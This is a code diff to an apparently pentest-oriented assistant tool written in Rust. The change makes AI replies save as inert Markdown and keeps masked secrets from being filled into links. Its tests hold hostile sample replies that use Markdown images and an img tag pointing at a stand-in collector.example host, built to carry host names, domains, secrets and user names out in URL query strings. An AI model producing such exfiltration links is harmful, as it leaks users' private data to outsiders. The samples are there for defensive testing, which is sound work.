@@ -28,7 +28,7 @@ use sha2::{Digest, Sha256};
 use crate::anthropic;
 use crate::checklist;
 use crate::db::Db;
-use crate::evidence::{sanitize, sanitize_block, Source, VerificationStatus};
+use crate::evidence::{sanitize, Source, VerificationStatus};
 use crate::graph::{Graph, Host};
 use crate::timeutil::{now_rfc3339, today_utc};
 use crate::vault::Vault;
@@ -714,7 +714,8 @@ fn mask_prompt(
             leaks.join(", ")
         );
     }
-    Ok((masked, vault.stream()))
+    let unmasker = vault.stream_for(&masked);
+    Ok((masked, unmasker))
 }
 
 /// Validates a cloud AI endpoint URL: must use `https://`, or `http://` only
@@ -1182,7 +1183,7 @@ pub fn append_chat(chats_dir: &Path, host: &Host, outcome: &Outcome) -> Result<P
         now_rfc3339(),
         outcome.tier.key(),
         outcome.tier.label(),
-        outcome.model
+        crate::evidence::inert_markdown(&sanitize(&outcome.model, 200))
     ));
     if let Some(reason) = &outcome.fallback_reason {
         entry.push_str(&format!(
@@ -1190,8 +1191,17 @@ pub fn append_chat(chats_dir: &Path, host: &Host, outcome: &Outcome) -> Result<P
             outcome.requested.key()
         ));
     }
-    // Model output is untrusted too: keep it as plain text lines.
-    entry.push_str(&sanitize_block(&outcome.text, MAX_REPLY));
+    // Model output is untrusted too: it is kept as Markdown that formats
+    // and does nothing else (no image, link or HTML of its making).
+    let mut reply = outcome.text.as_str();
+    if reply.len() > MAX_REPLY {
+        let mut end = MAX_REPLY;
+        while !reply.is_char_boundary(end) {
+            end -= 1;
+        }
+        reply = &reply[..end];
+    }
+    entry.push_str(crate::evidence::inert_markdown(reply).trim());
     entry.push_str("\n\n");
     let searches = match outcome.web_search_requests {
         0 => String::new(),
@@ -2295,6 +2305,82 @@ mod tests {
         }
         assert_eq!(chat_file_name("fe80::1%eth0"), "fe80__1_eth0.md");
         assert_eq!(chat_file_name("../../etc/passwd"), "_.._etc_passwd.md");
+
+        // A reply that tries to be more than text is saved as text.
+        let hostile = Outcome {
+            model: "evil ![m](https://collector.example/m.png)".into(),
+            text: "![status](https://collector.example/p.png?v=10.10.10.5)\n\
+                   <img src=//collector.example/x>\n[r]: https://collector.example/\n\
+                   Use `curl -s https://10.10.10.5/ | head` and a < b."
+                .into(),
+            ..outcome.clone()
+        };
+        let dir = tempfile::tempdir().unwrap();
+        let path = append_chat(dir.path(), host, &hostile).unwrap();
+        let text = std::fs::read_to_string(&path).unwrap();
+        for live in ["![status](", "![m](", "<img", "\n[r]:"] {
+            assert!(!text.contains(live), "{live:?} in {text}");
+        }
+        assert!(text.contains("Use `curl -s https://10.10.10.5/ | head` and a < b."));
+    }
+
+    #[tokio::test]
+    async fn a_reply_cannot_take_private_values_out_through_a_link() {
+        if !no_env_key() {
+            return;
+        }
+        // A provider (or whatever the model read) answers with an image
+        // whose address is built from placeholders, some never sent.
+        const REPLY: &str = "Patch <<HOST_01>> now. \
+            ![status](https://collector.example/p.png?h=<<HOST_01>>&d=<<DOM_01>>&s=<<SEC_01>>&u=<<USER_01>>) \
+            and open https://<<HOST_01>>/admin";
+        let seen: Arc<Mutex<Vec<Value>>> = Arc::default();
+        let app = Router::new()
+            .route(
+                "/cloud/chat/completions",
+                post(|State(seen): State<Arc<Mutex<Vec<Value>>>>, Json(body): Json<Value>| async move {
+                    seen.lock().unwrap().push(body);
+                    sse(&[REPLY], None)
+                }),
+            )
+            .with_state(Arc::clone(&seen));
+        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+        let base = format!("http://{}", listener.local_addr().unwrap());
+        tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
+
+        let (engine, _db) = engine(&base, Some("sk-or-test"));
+        let graph = lab();
+        let vault = Mutex::new(Vault::ephemeral());
+        // A secret of another host is in the vault from an earlier request.
+        vault
+            .lock()
+            .unwrap()
+            .register(crate::vault::Kind::Sec, "hunter2-elsewhere");
+        let (outcome, _) = run(&engine, Tier::Cloud, &graph, &vault).await;
+        let outcome = outcome.unwrap();
+        assert!(
+            outcome.text.starts_with("Patch 10.10.10.5 now."),
+            "{}",
+            outcome.text
+        );
+        assert!(
+            outcome.text.ends_with("and open https://10.10.10.5/admin"),
+            "{}",
+            outcome.text
+        );
+        // Inside the link to elsewhere nothing was filled in.
+        assert!(outcome
+            .text
+            .contains("?h=<<HOST_01>>&d=<<DOM_01>>&s=<<SEC_01>>&u=<<USER_01>>)"));
+        for private in ["hunter2-elsewhere", "portal.corp-acme.com", SECRET_JWT] {
+            assert!(!outcome.text.contains(private), "{private}");
+        }
+        // And the saved reply holds no image at all.
+        let dir = tempfile::tempdir().unwrap();
+        let path = append_chat(dir.path(), &graph.hosts["10.10.10.5"], &outcome).unwrap();
+        let saved = std::fs::read_to_string(path).unwrap();
+        assert!(!saved.contains("![status]("), "{saved}");
+        assert!(saved.contains("!\\[status]\\(https://collector.example/p.png?h=<&lt;HOST_01>>"));
     }
 
     #[tokio::test]
